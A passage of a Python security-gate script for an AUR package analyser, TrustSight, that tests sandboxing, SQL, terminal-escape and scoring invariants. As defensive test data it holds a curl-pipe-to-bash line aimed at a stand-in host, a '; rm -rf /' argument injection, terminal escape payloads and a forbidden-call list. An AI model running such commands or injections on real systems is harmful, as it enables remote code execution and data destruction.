"""The security-model gates, enforced.

``docs/security.md`` states what TrustSight guarantees.  This script is the
other half of that document: every invariant it lists has a check here, and
a check that fails is a claim that has stopped being true.  The split is the
same one ``calibration_gates.py`` makes for detection: the doc says what the
property is, the gate decides whether it holds.

Two families:

* **Part A** - TrustSight as a program consuming hostile input.  These are
  structural: no shell, one network host, bounded reads, parameterised SQL,
  sanitised output.
* **Part B** - what a verdict claims.  These are behavioural: an incomplete
  analysis cannot read as clean, a FATAL rule cannot be switched off, a seed
  cannot rewrite the database it is merged into.

Usage:
    python scripts/security_gates.py
    python scripts/security_gates.py --json security-gates.json

Exit code is 1 if any gate fails, 0 otherwise.
"""

import argparse
import ast
import io
import json
import re
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SRC = ROOT / "src" / "trustsight"

sys.path.insert(0, str(ROOT / "src"))


class Gate:
    """One invariant: what it is, whether it holds, and what it measured."""

    def __init__(self, name: str, passed: bool, measured, detail: str = ""):
        self.name = name
        self.passed = passed
        self.measured = measured
        self.detail = detail

    def as_dict(self) -> dict:
        return {
            "gate": self.name, "passed": self.passed,
            "measured": self.measured, "detail": self.detail,
        }


def _python_files() -> list[Path]:
    return sorted(p for p in SRC.rglob("*.py"))


def _rel(path: Path) -> str:
    return str(path.relative_to(ROOT))


# ---------------------------------------------------------------------------
# Part A: the program under attack
# ---------------------------------------------------------------------------

# Calls that hand attacker-influenced text to an interpreter, or that
# reconstruct objects from a serialised stream.  None of them have a
# legitimate use in this codebase.
_FORBIDDEN_CALLS = {
    "eval", "exec", "compile",
    "os.system", "os.popen",
    "subprocess.getoutput", "subprocess.getstatusoutput",
    "pickle.load", "pickle.loads",
    "marshal.load", "marshal.loads",
    "yaml.load",
}


def _call_name(node: ast.Call) -> str:
    parts: list[str] = []
    cur = node.func
    while isinstance(cur, ast.Attribute):
        parts.append(cur.attr)
        cur = cur.value
    if isinstance(cur, ast.Name):
        parts.append(cur.id)
    return ".".join(reversed(parts))


def gate_no_interpreter_calls() -> Gate:
    """No path turns text into code, and nothing is unpickled."""
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                name = _call_name(node)
                if name in _FORBIDDEN_CALLS:
                    hits.append(f"{_rel(path)}:{node.lineno} {name}()")
                if name.endswith("run") or name.endswith("Popen") or name.endswith("call"):
                    for kw in node.keywords:
                        if kw.arg == "shell" and not (
                            isinstance(kw.value, ast.Constant) and kw.value.value is False
                        ):
                            hits.append(f"{_rel(path)}:{node.lineno} shell=")
    return Gate("no interpreter or shell execution", not hits, hits)


# Modules allowed to open a socket.  Everything else, including all of
# analysis/, is offline by construction: the rule engine must never be
# able to turn a PKGBUILD into an outbound request.
_NETWORK_MODULES = {
    "discovery.py",
    "fetcher.py",
    "full_aur/fetch.py",
    "full_aur/metadata.py",
}

_NETWORK_CALLS = ("urlopen", "urlretrieve", "clone_repository", "create_connection")


def gate_network_is_confined() -> Gate:
    """Only the four fetch modules may open a connection."""
    hits: list[str] = []
    for path in _python_files():
        rel = str(path.relative_to(SRC))
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            name = _call_name(node).split(".")[-1]
            if name in _NETWORK_CALLS and rel not in _NETWORK_MODULES:
                hits.append(f"{_rel(path)}:{node.lineno} {name}()")
    return Gate("network confined to the fetch modules", not hits, hits)


# A URL *constant* - a module-level name ending in URL bound to a literal.
# Host names also appear all over the source as data (paste hosts in the
# config defaults, example.org in a docstring, evil.sh in a fixture), and
# those are not endpoints.  What makes something an endpoint is that a
# request is built from it, so that is what is checked.
_URL_LITERAL_RE = re.compile(r"https?://([A-Za-z0-9.-]+\.[A-Za-z]{2,})")
_ENDPOINT_HOST = "aur.archlinux.org"


def gate_single_network_host() -> Gate:
    """Every endpoint constant in the source names the AUR and nothing else."""
    hits: list[str] = []
    found = set()
    for path in _python_files():
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Assign):
                continue
            names = [t.id for t in node.targets if isinstance(t, ast.Name)]
            if not any(n.upper().rstrip("_").endswith("URL") for n in names):
                continue
            if not isinstance(node.value, ast.Constant) or not isinstance(node.value.value, str):
                continue
            for host in _URL_LITERAL_RE.findall(node.value.value):
                found.add(host)
                if host != _ENDPOINT_HOST:
                    hits.append(f"{_rel(path)}:{node.lineno} {host}")
    if not found:
        hits.append("no endpoint constant found: the check is not looking at anything")
    return Gate("one network host, declared", not hits, hits or sorted(found))


def gate_network_reads_are_bounded() -> Gate:
    """Every outbound request carries an explicit timeout."""
    hits: list[str] = []
    for path in _python_files():
        if str(path.relative_to(SRC)) not in _NETWORK_MODULES:
            continue
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] not in ("urlopen", "urlretrieve"):
                continue
            if not any(kw.arg == "timeout" for kw in node.keywords):
                hits.append(f"{_rel(path)}:{node.lineno} no timeout=")
    return Gate("every request has a timeout", not hits, hits)


def gate_no_archive_extraction() -> Gate:
    """Nothing an archive contains is ever written to disk by path."""
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                name = _call_name(node).split(".")[-1]
                if name in ("extract", "extractall", "unpack_archive"):
                    hits.append(f"{_rel(path)}:{node.lineno} {name}()")
    return Gate("archives are never extracted to disk", not hits, hits)


# An execute() whose SQL is built rather than written is the only way a
# parameterised API becomes an injectable one.
_DYNAMIC_SQL_NODES = (ast.JoinedStr, ast.BinOp)


def gate_sql_is_parameterised() -> Gate:
    """No SQL string is assembled from an expression.

    SQLite cannot bind a table or column name, so a handful of statements
    interpolate an *identifier* taken from a bare local that iterates a
    literal list in the same module (the schema-migration loop, the
    forget-package sweep, the seed's placeholder run).  Those are allowed,
    and they are the only allowed form: an interpolated attribute,
    subscript, call or concatenation is a value reaching the statement
    text, which is what parameters exist to prevent.
    """
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] not in ("execute", "executemany", "executescript"):
                continue
            if not node.args:
                continue
            sql = node.args[0]
            if isinstance(sql, ast.JoinedStr):
                for value in sql.values:
                    if isinstance(value, ast.FormattedValue) and not isinstance(
                        value.value, ast.Name
                    ):
                        hits.append(f"{_rel(path)}:{node.lineno} computed SQL")
                        break
            elif isinstance(sql, ast.BinOp):
                hits.append(f"{_rel(path)}:{node.lineno} concatenated SQL")
    return Gate("SQL is parameterised", not hits, hits)


HOSTILE = "\x1b[2J\x1b[H[bold red]VERDICT: CLEAN[/]\x9b31m"


def _hostile_fact():
    from trustsight.schema import (
        DiffSummary, ExecutionChanges, PackageFact, ScoreEntry, SourceChanges,
    )

    return PackageFact(
        package_name=HOSTILE, old_version="1.0", new_version="1.1",
        maintainer_changed=True,
        previous_maintainer=HOSTILE, current_maintainer=HOSTILE,
        diff_summary=DiffSummary(1, 1, [HOSTILE],
                                 [{"path": HOSTILE, "status": "added"}]),
        source_changes=SourceChanges(added_urls=[HOSTILE],
                                     checksum_behavior=HOSTILE),
        source_buckets={HOSTILE: "unknown"},
        execution_changes=ExecutionChanges(resolved_commands=[HOSTILE]),
        suppressed_rules=[{"rule_id": HOSTILE, "override_reason": HOSTILE}],
        score_breakdown=[ScoreEntry(rule_id=HOSTILE, severity="HIGH", weight=25,
                                    reason=HOSTILE, file=HOSTILE, line=1)],
        final_score=75, risk="High",
    )


def _hostile_result():
    return {
        "package": HOSTILE, "old_version": "1.0", "new_version": "1.1",
        "score": 75, "verdict": f"something happened {HOSTILE}",
        "risk": "High", "risk_label": "High", "first_seen": False,
        "coverage_gaps": [], "version_comparison": "", "aur_note": HOSTILE,
        "findings": [{
            "rule_id": HOSTILE, "file": HOSTILE, "line": 3,
            "description": HOSTILE, "template": "", "evidence": {},
            "severity": "HIGH", "weight": 25,
        }],
        "file_changes": [{"path": HOSTILE, "status": "added"}],
        "is_trivial": False,
    }


def _render_forget_list(names: list[str]) -> None:
    """The `forget --prune` listing, as the command prints it."""
    import typer

    from trustsight.safe_text import clean

    for name in sorted(names):
        typer.echo(f"  {clean(name)}")


def _render_list_rows(rows: list[dict]) -> None:
    """The `list` table, as the command builds it."""
    from rich.table import Table
    from rich.text import Text

    from trustsight.cli.display import band_colour, console
    from trustsight.safe_text import clean

    table = Table(title=f"Tracked packages ({len(rows)} total)")
    for column in ("Package", "Version", "Maintainer", "Last Checked", "Score", "Risk"):
        table.add_column(column)
    for row in rows:
        table.add_row(
            Text(clean(row["name"])), Text(row["version"]),
            Text(clean(row["maintainer"])), row["last_checked"][:10],
            Text(str(row["score"])), Text(row["risk"], style=band_colour(row["risk"])),
        )
    console().print(table)


def gate_terminal_output_is_inert() -> Gate:
    """No renderer lets a hostile package write escapes to the terminal.

    *Every* render path, not one of them.  The first version of this gate
    exercised ``review``'s Rich renderer alone and passed while
    ``_inspect_rich`` leaked escape sequences through an unsanitised rule
    id, which is the failure mode described in
    [reviewing a security control](../docs/contributing/security-review.md):
    a control applied at one of several equivalent call sites, with the
    check pointed at a covered one.
    """
    import contextlib

    from rich.console import Console

    import trustsight.cli.corpus as corpus_cli
    import trustsight.cli.display as display
    import trustsight.cli.inspect as inspect_cli
    import trustsight.cli.review as review

    fact, result = _hostile_fact(), _hostile_result()

    def rich(fn) -> str:
        buffer = io.StringIO()
        saved = display._console
        display._console = Console(file=buffer, force_terminal=False, width=200)
        try:
            fn()
        finally:
            display._console = saved
        return buffer.getvalue()

    def plain(fn) -> str:
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            fn()
        return buffer.getvalue()

    renders = {
        "review rich": lambda: rich(
            lambda: review._render_results_rich([result], 1, False, True, True, False)),
        "inspect rich": lambda: rich(
            lambda: inspect_cli._inspect_rich(fact, show_score=True, show_risk=True)),
        "inspect plain": lambda: plain(
            lambda: inspect_cli._inspect_plain(fact, show_score=True, show_risk=True)),
        # forget/history/list were outside this gate entirely, and
        # forget echoed DB-stored package names raw.  Every surface that
        # prints attacker-influenced text belongs here, not the three that
        # were convenient to construct.
        "forget list": lambda: plain(lambda: _render_forget_list([HOSTILE])),
        "list table": lambda: rich(lambda: _render_list_rows([{
            "name": HOSTILE, "version": "1.0", "last_checked": "2026-01-01",
            "score": 40, "risk": "Medium", "maintainer": HOSTILE,
        }])),
        "corpus pivot": lambda: rich(lambda: corpus_cli._render_pivot({
            "indicator": HOSTILE, "type": "host", "listed": True,
            "confidence": HOSTILE, "sources": ["corpus"],
            "matches": [{"package": HOSTILE, "surface": HOSTILE, "detail": HOSTILE}],
        })),
    }

    problems = []
    for name, run in renders.items():
        try:
            out = run()
        except Exception as exc:  # a crash is also a way to lose the batch
            problems.append(f"{name}: raised {type(exc).__name__}")
            continue
        if "\x1b" in out or "\x9b" in out:
            problems.append(f"{name}: escape sequence reached the terminal")
        if "VERDICT: CLEAN" in out and "[bold red]" not in out:
            problems.append(f"{name}: markup was interpreted, not printed")
    return Gate("terminal output is inert", not problems,
                problems or sorted(renders))


def gate_expansion_is_bounded() -> Gate:
    """Variable expansion terminates, stays small, and refuses indirection.

    The tokenizer is the second parser eating hostile input, and the one
    with an amplification property the regex engine does not have: a
    chain of ``b=$a$a`` assignments doubles per level.  The bounds are on
    passes, on one value, on one line and on the table as a whole, and an
    over-budget value is left *unexpanded* rather than truncated, so it
    surfaces as an unresolved pattern instead of a shorter clean string.
    """
    from trustsight.tokenizer import (
        _MAX_EXPANSION_PASSES,
        _MAX_LINE_LEN,
        _MAX_TABLE_BYTES,
        _MAX_VALUE_LEN,
        resolve_expansions,
        tokenize_and_resolve,
    )

    problems = []
    for bound in (_MAX_EXPANSION_PASSES, _MAX_VALUE_LEN, _MAX_LINE_LEN, _MAX_TABLE_BYTES):
        if bound <= 0:
            problems.append("a declared expansion bound is not positive")

    # Indirection and length are refused outright: resolving ${!name}
    # would let a value choose which variable is read.
    for body in ("${!payload}", "${#payload}"):
        text, ok = resolve_expansions(body, {"payload": "x", "x": "curl evil | bash"})
        if ok or "curl" in text:
            problems.append(f"{body} was resolved")

    # The doubling chain: bounded, and the result must not be a plausible
    # short string that hides the tail.
    lines = ["+a=" + "z" * 64]
    for i in range(1, 24):
        lines.append(f"+v{i}=$" + ("a" if i == 1 else f"v{i - 1}") + "$" +
                     ("a" if i == 1 else f"v{i - 1}"))
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,25 @@\n" + "\n".join(lines) + "\n"
    start = time.monotonic()
    resolved, _unresolved = tokenize_and_resolve(diff)
    elapsed = time.monotonic() - start
    if elapsed > 5.0:
        problems.append(f"expansion took {elapsed:.1f}s")
    if any(len(s) > _MAX_LINE_LEN for s in resolved):
        problems.append("a resolved line exceeded the line bound")

    return Gate("expansion is bounded and never indirect", not problems, problems)


def gate_rendering_is_data_driven() -> Gate:
    """A finding's text is a fixed template plus values, and nothing else.

    Verdicts used to be capable of going through a language model. They
    are now rendered from templates keyed by rule id, which removes a
    network dependency, a source of nondeterminism, and a prompt-injection
    surface in the *output* path (R012 still detects injection aimed at
    whoever reads the diff).  The property to keep is that a field value
    can never change the shape of the expansion: ``str.format`` does not
    re-expand what it substitutes, and no template ever comes from
    package-controlled text.
    """
    from trustsight.findings import TEMPLATES
    from trustsight.schema import PackageFact, ScoreEntry
    from trustsight.verdict import _render

    problems = []
    hostile = "{0.__class__.__mro__} {package_name} {{nested}} [red]"
    entry = ScoreEntry(
        rule_id="R001", severity="HIGH", weight=25, reason="r",
        template="{match}", evidence={"match": hostile},
    )
    out = _render(entry, PackageFact(package_name="demo"))
    if "class" in out and "__mro__" not in out:
        problems.append("a field value was evaluated rather than substituted")
    if hostile not in out:
        problems.append("a field value was re-expanded rather than substituted")

    # A template that wants a field the evidence does not carry must fall
    # back, not raise: a KeyError here would abort a whole batch.
    missing = ScoreEntry(rule_id="R001", template="{absent}", evidence={})
    if not _render(missing, PackageFact()):
        problems.append("a missing template field produced no text")

    if not TEMPLATES:
        problems.append("no templates are defined")

    # No model, no transport, anywhere in the rendering path.
    for module in ("verdict.py", "findings.py"):
        text = (SRC / module).read_text().lower()
        for banned in ("openai", "anthropic", "requests", "urllib.request", "httpx"):
            if banned in text:
                problems.append(f"{module} references {banned}")
    return Gate("report rendering is data-driven", not problems, problems)


def gate_version_args_are_shape_checked() -> Gate:
    """``vercmp`` has no ``--``, so the argument shape is the only guard.

    Versions come from the AUR, so they are attacker-influenced. Anything
    that is not version-shaped is compared in-process instead of being put
    on a command line.
    """
    from trustsight.discovery import _VERSION_ARG_RE

    problems = []
    for hostile in ("-h", "--help", "-1:2.0", "; rm -rf /", "1.0 --flag", "", "-"):
        if _VERSION_ARG_RE.match(hostile):
            problems.append(f"{hostile!r} passed the shape check")
    for ordinary in ("1.0", "1:1.1.1w-1", "2.0.0.r15.g0a1b2c3-1", "1.0_beta+2~rc1"):
        if not _VERSION_ARG_RE.match(ordinary):
            problems.append(f"{ordinary!r} failed the shape check")
    return Gate("version arguments are shape-checked", not problems, problems)


def gate_regex_input_is_bounded() -> Gate:
    """A single enormous line cannot stall *any* rule engine.

    Measured through ``scan_diff``, not through ``apply_rules`` alone.
    The rules in ``rules.toml`` go through ``apply_rules`` and were
    clamped; the larger set emitted from ``analysis/`` matches the diff
    text directly, and a gate that only exercised the first missed a
    5 MiB line costing 15s in the second while reporting 0.17s.  The
    property is about the pipeline an attacker actually reaches.
    """
    from trustsight.analysis import scan_diff
    from trustsight.config import load_config
    from trustsight.coverage import LINE_TRUNCATED

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,3 @@\n pkgname=demo\n"
    diff = header + "+build() { " + ("a" * (5 * 1024 * 1024)) + " ; }\n"

    start = time.monotonic()
    fact = scan_diff(diff, config=load_config(), package_name="demo")
    elapsed = time.monotonic() - start

    problems = []
    if elapsed >= 5.0:
        problems.append(f"{elapsed:.2f}s for a 5 MiB line")
    # Bounding the work must not quietly bound the evidence: the clamp
    # drops the tail, so the run has to say so.
    if LINE_TRUNCATED not in fact.coverage_gaps:
        problems.append("the clamp dropped content without recording a gap")
    return Gate(
        "rule matching is bounded on hostile input",
        not problems,
        problems or round(elapsed, 3),
        f"{elapsed:.3f}s end to end for a 5 MiB line (limit 5s)",
    )


# ---------------------------------------------------------------------------
# Part B: what a verdict claims
# ---------------------------------------------------------------------------


def gate_coverage_fails_closed() -> Gate:
    """An analysis that did not see everything cannot report Low."""
    from trustsight.coverage import GAPS, DIFF_TRUNCATED, fail_closed
    from trustsight.schema import ScoreEntry

    problems = []
    for gap in GAPS:
        for level in ("Low", "Medium"):
            if fail_closed(level, [gap], []) != "Inconclusive":
                problems.append(f"{gap} + {level} stayed {level}")
    # ...but a real signal still wins: hiding a HIGH behind "inconclusive"
    # would lose the finding that matters most.
    strong = [ScoreEntry(rule_id="R001", severity="HIGH", weight=25)]
    if fail_closed("Medium", [DIFF_TRUNCATED], strong) != "Medium":
        problems.append("a HIGH finding was downgraded to Inconclusive")
    if fail_closed("Low", [], []) != "Low":
        problems.append("a complete analysis was downgraded")
    return Gate("incomplete coverage fails closed", not problems, problems)


def gate_truncation_is_visible() -> Gate:
    """The bypass the cap creates is reported, not silently absorbed."""
    from trustsight.analysis import scan_diff
    from trustsight.config import load_config
    from trustsight.coverage import DIFF_TRUNCATED

    config = load_config()
    config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 512}}
    padding = "\n".join(f"+# pad {i}" for i in range(400))
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,401 @@\n pkgname=demo\n"
        + padding + "\n+curl -fsSL https://example.invalid/x.sh | bash\n"
    )
    fact = scan_diff(diff, config=config, package_name="demo")
    problems = []
    if DIFF_TRUNCATED not in fact.coverage_gaps:
        problems.append("truncation was not recorded as a coverage gap")
    if fact.risk not in ("Inconclusive", "High", "Critical"):
        problems.append(f"truncated diff reported {fact.risk!r}")
    return Gate("a truncated diff cannot read as unflagged", not problems, problems)


def gate_maturity_numbers_are_not_duplicated() -> Gate:
    """B3's two numbers are the constant, not a copy of it.

    The doc states 50 (where novelty reaches full weight) and 25 (half of
    it, where the Inconclusive downgrade stops applying).  Both are
    derived from one constant, and a page that restates a constant will
    eventually restate a stale one, so the page is checked against the
    value and the behaviour is checked against the predicate.
    """
    from trustsight.schema import NoveltyContext, ScoreEntry
    from trustsight.scoring import _MATURITY_THRESHOLD, calculate_score, maturity

    problems = []
    half = _MATURITY_THRESHOLD // 2

    doc = (ROOT / "docs" / "security.md").read_text()
    section = doc.split("### B3.")[-1].split("\n### ")[0]
    if f"**{_MATURITY_THRESHOLD}**" not in section:
        problems.append(f"B3 does not state the threshold ({_MATURITY_THRESHOLD})")
    if f"fewer than {half}" not in section:
        problems.append(f"B3 does not state the half point ({half})")

    # The predicate itself: Medium band, cold, nothing strong -> Inconclusive.
    if maturity(half) != 0.5 or maturity(_MATURITY_THRESHOLD) != 1.0:
        problems.append("the maturity ramp does not reach 0.5 and 1.0 where stated")

    weak = [{"rule_id": "R050", "severity": "MEDIUM", "name": "w", "match": ""}] * 2
    cold = NoveltyContext(observation_count=half - 1)
    warm = NoveltyContext(observation_count=_MATURITY_THRESHOLD)
    _s, _b, cold_level = calculate_score(weak, {}, cold)
    _s, _b, warm_level = calculate_score(weak, {}, warm)
    if cold_level != "Inconclusive":
        problems.append(f"a cold Medium was reported {cold_level!r}")
    if warm_level == "Inconclusive":
        problems.append("a warm Medium was downgraded")

    strong = weak + [{"rule_id": "R001", "severity": "HIGH", "name": "s", "match": ""}]
    _s, _b, strong_level = calculate_score(strong, {}, cold)
    if strong_level == "Inconclusive":
        problems.append("a HIGH finding was downgraded by the cold-start rule")

    return Gate("the maturity numbers are derived, not copied", not problems,
                problems or {"threshold": _MATURITY_THRESHOLD, "half": half})


def gate_fatal_rules_cannot_be_removed() -> Gate:
    """Deleting or downgrading a FATAL rule in rules.toml does not work."""
    from trustsight.config import (
        enforce_fatal_rules, shipped_fatal_rule_ids, shipped_rules,
    )

    fatal_ids = shipped_fatal_rule_ids()
    problems = []
    if not fatal_ids:
        problems.append("no shipped rule is FATAL")
    for rid in fatal_ids:
        deleted = [r for r in shipped_rules() if r["id"] != rid]
        effective, restored = enforce_fatal_rules(deleted)
        if rid not in restored or not any(
            r["id"] == rid and r["severity"] == "FATAL" for r in effective
        ):
            problems.append(f"{rid} stayed deleted")

        downgraded = [
            dict(r, severity="INFO") if r["id"] == rid else r
            for r in shipped_rules()
        ]
        effective, restored = enforce_fatal_rules(downgraded)
        if rid not in restored or not any(
            r["id"] == rid and r["severity"] == "FATAL" for r in effective
        ):
            problems.append(f"{rid} stayed downgraded")
    return Gate("FATAL rules cannot be switched off", not problems,
                problems or fatal_ids)


def gate_fatal_findings_cannot_be_suppressed() -> Gate:
    """An override never hides a FATAL finding, whatever the file says."""
    import trustsight.override as override_module

    saved = override_module.load_overrides
    override_module.load_overrides = lambda: [
        override_module.RuleOverride(rule_id="R012", reason="test", package=None),
        override_module.RuleOverride(rule_id="R055", reason="test", package=None),
    ]
    try:
        kept, suppressed = override_module.filter_triggered_rules([
            {"rule_id": "R012", "severity": "FATAL", "name": "x"},
            {"rule_id": "R055", "severity": "MEDIUM", "name": "y"},
        ])
    finally:
        override_module.load_overrides = saved

    problems = []
    if not any(r["rule_id"] == "R012" for r in kept):
        problems.append("a FATAL finding was suppressed")
    if not any(r["rule_id"] == "R055" for r in suppressed):
        problems.append("a suppressed finding was discarded instead of reported")
    return Gate("FATAL findings survive every override", not problems, problems)


def gate_seed_cannot_rewrite_the_database() -> Gate:
    """A seed describes itself; it does not get to set anything else."""
    import sqlite3
    import tempfile

    import trustsight.db as db

    from calibration_gates import shipped_config

    problems = []
    with shipped_config():
        db.init_db()
        db.set_metadata("baseline_provenance", "local")

        # A locally learned maintainer count: the seed must not be able to
        # raise it, because a high count is what makes R071/R090 stay quiet.
        with db.get_connection() as local:
            local.execute(
                "INSERT OR REPLACE INTO maintainer_counts (name, count) "
                "VALUES ('victim', 1)"
            )
            local.commit()

        seed_path = Path(tempfile.mkstemp(suffix=".db")[1])
        conn = sqlite3.connect(seed_path)
        conn.executescript(
            """
            CREATE TABLE metadata (key TEXT PRIMARY KEY, value TEXT);
            CREATE TABLE source_urls (
                url TEXT PRIMARY KEY, first_seen_package_id INTEGER,
                first_seen_globally_timestamp INTEGER, total_uses INTEGER,
                last_seen_timestamp INTEGER);
            CREATE TABLE maintainers (
                name TEXT PRIMARY KEY, package_count INTEGER,
                first_seen_timestamp INTEGER, last_seen_timestamp INTEGER);
            CREATE TABLE maintainer_counts (name TEXT PRIMARY KEY, count INTEGER);
            INSERT INTO metadata VALUES ('seed_observation_count', '100');
            INSERT INTO metadata VALUES ('baseline_provenance', 'ATTACKER');
            INSERT INTO maintainer_counts VALUES ('victim', 9999);
            """
        )
        conn.commit()
        conn.close()

        db.import_seed(seed_path)
        if db.get_metadata("baseline_provenance") != "local":
            problems.append("the seed overwrote a key it does not own")
        if db.get_metadata(db.SEED_OBSERVATION_KEY) != "100":
            problems.append("the seed's own key was not applied")
        if not db.get_metadata(db.SEED_DIGEST_KEY):
            problems.append("the imported seed's digest was not recorded")
        with db.get_connection() as local:
            row = local.execute(
                "SELECT count FROM maintainer_counts WHERE name = 'victim'"
            ).fetchone()
        if row is None or row["count"] != 1:
            problems.append("the seed overwrote a locally learned maintainer count")
        seed_path.unlink(missing_ok=True)
    return Gate("a seed cannot rewrite the database", not problems, problems)


def gate_every_producer_accounts_for_coverage() -> Gate:
    """Every construction of a PackageFact declares what it examined.

    Enumerated from the source rather than from the paths a test happens
    to call.  Four of the five producers set ``coverage_gaps``; the fifth,
    the first-analysis path, declared ``tree_analyzed=True`` having read
    no tree at all and reported a bare "Low".  A producer added later
    fails here rather than shipping a result that silently claims full
    coverage.
    """
    hits: list[str] = []
    found = 0
    for path in _python_files():
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] != "PackageFact":
                continue
            found += 1
            kwargs = {kw.arg for kw in node.keywords}
            if "coverage_gaps" not in kwargs:
                hits.append(f"{_rel(path)}:{node.lineno} no coverage_gaps=")
            # tree_analyzed=True as a literal is a claim, not a measurement.
            for kw in node.keywords:
                if kw.arg == "tree_analyzed" and isinstance(kw.value, ast.Constant):
                    if kw.value.value is True:
                        hits.append(
                            f"{_rel(path)}:{node.lineno} tree_analyzed hardcoded True"
                        )
    if not found:
        hits.append("no PackageFact construction found: the check sees nothing")
    return Gate("every result declares its coverage", not hits, hits or found)


def gate_a_gap_is_always_shown_with_the_band() -> Gate:
    """A reviewer never sees a bare band for an incomplete analysis.

    ``fail_closed`` lets a HIGH keep its band, which leaves the decoy
    move: pad past the cap, put the payload after the cut, and include
    one cheap deliberate HIGH in the visible prefix.  The verdict then
    reads "High" and the reviewer anchors on the decoy.  So the band a
    person is shown carries the caveat wherever it appears.
    """
    from trustsight.coverage import DIFF_TRUNCATED, INCOMPLETE_SUFFIX, qualified_band
    from trustsight.schema import PackageFact
    from trustsight.scoring import verdict_label, verdict_level

    problems = []
    for band in ("Low", "Medium", "High", "Critical"):
        if qualified_band(band, [DIFF_TRUNCATED]) != band + INCOMPLETE_SUFFIX:
            problems.append(f"{band} was shown bare despite a gap")
        if qualified_band(band, []) != band:
            problems.append(f"{band} was qualified without a gap")

    decoy = PackageFact(final_score=75, risk="High", coverage_gaps=[DIFF_TRUNCATED])
    if verdict_label(decoy) != "High" + INCOMPLETE_SUFFIX:
        problems.append("the decoy case rendered as a bare High")
    if verdict_level(decoy) != "High":
        problems.append("the machine-readable band was polluted with prose")

    # Every human-facing render must go through verdict_label, never
    # verdict_level: the two differ only here, so a display path using the
    # wrong one is exactly the regression this gate exists to catch.
    for module in ("cli/review.py", "cli/inspect.py"):
        text = (SRC / module).read_text()
        for lineno, line in enumerate(text.splitlines(), start=1):
            if "verdict_level(" in line and "risk_label" not in line and '"risk"' not in line:
                if "risk = verdict_level(fact)" not in line:
                    problems.append(f"{module}:{lineno} displays a bare band")
    return Gate("a coverage gap is always shown with the band", not problems, problems)


def gate_reserved_names_are_refused_everywhere() -> Gate:
    """No writer accepts a package name the rest of the code treats as internal.

    ``packages`` is guarded because ``upsert_package`` checks, but
    ``package_profiles`` and ``pkgbuild_snapshots`` are keyed by
    ``package_name`` directly and were not.  Both are on the
    ``import_baseline`` path, and AUR names may begin with an underscore,
    so ``__seed__`` is a name someone could register.  Every writer that
    takes a package name is checked here rather than three of them.
    """
    import trustsight.db as db

    from calibration_gates import shipped_config

    writers = [
        ("upsert_package", lambda n: db.upsert_package(n, "1.0")),
        ("save_package_profile", lambda n: db.save_package_profile(n, 1, "Low")),
        ("save_pkgbuild_snapshot", lambda n: db.save_pkgbuild_snapshot(n, "x", "1")),
    ]
    problems = []
    with shipped_config():
        db.init_db()
        for name in ("__seed__", "__evil", "__"):
            for label, call in writers:
                try:
                    call(name)
                    problems.append(f"{label} accepted {name!r}")
                except ValueError:
                    pass
        # ...and an ordinary name is still writable.
        for label, call in writers:
            try:
                call("ordinary-pkg")
            except ValueError:
                problems.append(f"{label} rejected an ordinary name")
    return Gate("reserved names are refused by every writer", not problems, problems)


def gate_a_baseline_supplies_state_not_rules() -> Gate:
    """A corpus baseline is prior state; it cannot change what a rule does.

    The importer writes package profiles, PKGBUILD snapshots and the
    metadata snapshot, and nothing else.  It never touches rules, weights,
    severities or thresholds, so a hostile-but-validly-signed baseline can
    make the present look unremarkable, exactly like a seed, but cannot
    change what any rule matches or what any finding is worth.
    """
    import trustsight.full_aur.export as export

    allowed_writers = {
        "save_package_profile", "save_pkgbuild_snapshot", "save_metadata",
    }
    forbidden = {
        "set_metadata", "load_rules", "sync_rules", "write_default_file",
        "add_override", "save_overrides",
    }
    tree = ast.parse((SRC / "full_aur" / "export.py").read_text())
    fn = next(
        node for node in ast.walk(tree)
        if isinstance(node, ast.FunctionDef) and node.name == "import_baseline"
    )
    problems = []
    for node in ast.walk(fn):
        if isinstance(node, ast.Call):
            name = _call_name(node).split(".")[-1]
            if name in forbidden:
                problems.append(f"import_baseline calls {name}()")
    written = {
        _call_name(node).split(".")[-1]
        for node in ast.walk(fn)
        if isinstance(node, ast.Call)
    }
    if not (written & allowed_writers):
        problems.append("import_baseline writes nothing the gate recognises")
    if not hasattr(export, "InvalidSignatureError"):
        problems.append("the signature check is gone")
    return Gate("a baseline supplies state, not rules", not problems, problems)


def gate_source_urls_are_never_fetched() -> Gate:
    """Nothing derived from a PKGBUILD reaches a network call.

    Checked structurally: the analysis package, where ``source=`` URLs are
    parsed and classified, imports no transport at all.
    """
    hits: list[str] = []
    banned = {"urllib.request", "http.client", "socket", "requests", "httpx", "ftplib"}
    for path in sorted((SRC / "analysis").rglob("*.py")):
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name in banned:
                        hits.append(f"{_rel(path)}:{node.lineno} {alias.name}")
            elif isinstance(node, ast.ImportFrom) and node.module in banned:
                hits.append(f"{_rel(path)}:{node.lineno} {node.module}")
    return Gate("declared source URLs are never fetched", not hits, hits)


_ATX_PUNCT_RE = re.compile(r"[^\w\s-]")
_MD_LINK_RE = re.compile(r"\]\(([^)\s]+)\)")
_INLINE_CODE_RE = re.compile(r"`[^`]*`")


def _anchor(heading: str) -> str:
    """The slug a Markdown renderer derives from a heading."""
    text = heading.lstrip("#").strip()
